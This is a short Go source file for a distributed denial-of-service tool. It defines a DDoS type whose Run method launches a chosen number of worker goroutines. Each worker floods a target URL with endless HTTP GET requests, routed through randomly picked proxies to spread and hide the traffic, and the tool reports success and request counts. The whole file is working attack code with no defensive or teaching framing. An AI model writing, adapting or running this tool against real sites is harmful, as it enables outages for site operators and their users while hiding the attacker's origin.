package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"runtime"
	"sync/atomic"
	"time"
)

// DDoS - structure of value for DDoS attack
type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64
	amountRequests int64
	clients        []*http.Client
	randnom        *rand.Rand
}

// New - initialization of new DDoS attack
func NewDdos(URL string, workers int, proxyList []string) (*DDoS, error) {
	source := rand.NewSource(time.Now().Unix())
	r := rand.New(source)

	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("Undefined host or error = %v", err)
	}

	var clientList []*http.Client

	for _, proxy := range proxyList {
		proxyUrl, err := url.Parse(proxy)
		if err != nil {
			return nil, err
		}

		client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyUrl)}}
		clientList = append(clientList, client)

	}

	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
		clients:       clientList,
		randnom:       r,
	}, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					req, _ := http.NewRequest("GET", d.url, nil)

					clientNum := d.randnom.Intn(len(d.clients))

					resp, err := d.clients[clientNum].Do(req)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
				runtime.Gosched()
			}
		}()
	}
}

// Stop - stop DDoS attack
func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		(*d.stop) <- true
	}
	close(*d.stop)
}

// Result - result of DDoS attack
func (d DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}
